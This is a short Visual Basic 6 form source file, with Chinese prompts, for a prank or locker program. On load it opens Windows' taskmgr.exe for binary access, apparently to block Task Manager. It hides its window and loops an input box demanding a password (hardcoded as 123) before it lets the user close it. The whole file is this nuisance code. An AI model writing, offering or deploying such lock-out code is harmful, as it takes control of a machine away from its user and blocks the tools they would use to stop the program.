VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   LinkTopic       =   "Form1"
   ScaleHeight     =   3015
   ScaleWidth      =   4560
   StartUpPosition =   3  '窗口缺省
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Open Environ$("WinDir") & "\system32\taskmgr.exe" For Binary As #1
Form1.BorderStyle = 0
Do While True
x = Val(InputBox("请输入密码", "输入密码即可关闭"))
If x = 123 Then
Exit Do
End If
Loop
MsgBox "正确"
End Sub
